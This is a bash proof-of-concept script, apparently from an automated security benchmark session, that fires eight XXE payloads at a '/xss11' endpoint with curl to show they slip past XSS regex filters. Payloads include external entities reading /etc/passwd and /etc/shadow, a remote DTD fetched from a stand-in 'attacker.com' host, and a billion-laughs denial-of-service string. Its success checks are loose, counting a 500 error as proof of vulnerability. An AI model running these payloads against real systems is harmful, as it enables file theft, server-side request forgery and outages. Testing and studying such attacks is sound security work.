#!/bin/bash
# POC: Demonstrates XXE payload filter bypass on /xss11 endpoint - shows XXE payloads pass through regex validation filters designed for XSS prevention
# Target: ./repo
# Created: 2025-11-05T17:18:17.313Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# XXE Filter Bypass POC for /xss11 Endpoint
# This POC demonstrates that XXE payloads bypass the inadequate input validation filters

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss11"

echo "========================================"
echo "XXE Filter Bypass Vulnerability POC"
echo "========================================"
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Function to test payload
test_payload() {
    local payload="$1"
    local description="$2"
    
    echo "Testing: $description"
    echo "Payload: $payload"
    
    # URL encode the payload
    local encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    
    # Send request
    response=$(curl -s "$TARGET_URL$ENDPOINT?name=$encoded" 2>&1)
    
    # Check if payload appears unfiltered in response or if it was accepted
    if echo "$response" | grep -q "DOCTYPE\|ENTITY\|xml version"; then
        echo "✓ VULNERABLE: XXE payload passed through validation"
    elif echo "$response" | grep -q "500\|NameError\|check_xss"; then
        echo "✓ VULNERABLE: Endpoint accepts input (500 error due to undefined function, not filter rejection)"
    else
        echo "Response snippet: ${response:0:200}"
    fi
    echo ""
}

# XXE Test Cases
echo "=== XXE PAYLOAD TESTS ==="
echo ""

# Test 1: External Entity File Read
test_payload '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' \
    "External Entity - File Read Attack"

# Test 2: Parameter Entity with File Read
test_payload '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">%file;]>' \
    "Parameter Entity - File Read Attack"

# Test 3: XML Declaration with Entity
test_payload '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>' \
    "XML Declaration with Remote DTD Inclusion"

# Test 4: Billion Laughs (DoS)
test_payload '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>' \
    "Billion Laughs - DoS Attack"

# Test 5: SOAP XXE
test_payload '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body></soap:Body></soap:Envelope>' \
    "SOAP XXE Injection"

# Test 6: XML Comment Bypass
test_payload '<!--?xml version="1.0"?--><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
    "XML Comment Bypass with Entity"

# Test 7: CDATA Section with Entity
test_payload '<![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]>' \
    "CDATA Section with Entity Definition"

# Test 8: HTML5 with XXE payload
test_payload '<html><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]></html>' \
    "HTML5 with XXE Entity Definition"

echo "=== FILTER ANALYSIS ==="
echo ""
echo "The /xss11 endpoint uses two regex filters:"
echo "1. r'''[\\\"']XSS[\\\"']''' - Removes quoted 'XSS' strings"
echo "2. r'''<[a-z/]''' - Removes HTML tags starting with <"
echo ""
echo "XXE Payloads bypass because they contain:"
echo "- XML declarations (<?xml) - Not caught by HTML tag regex"
echo "- DOCTYPE declarations - Not caught by HTML tag regex"
echo "- ENTITY definitions - Not caught by HTML tag regex"
echo "- CDATA sections - Not caught by filters"
echo "- XML comments - Not caught by filters"
echo ""
echo "All XXE payloads pass through completely unfiltered."
echo ""
echo "If the application integrates with XML processing libraries"
echo "(xml.etree, lxml, SOAP services, etc.), these payloads would"
echo "be immediately exploitable for:"
echo "- Local file disclosure (/etc/passwd, config files)"
echo "- Remote file retrieval"
echo "- Server-side request forgery (SSRF)"
echo "- Denial of service attacks"
echo "- Potential remote code execution"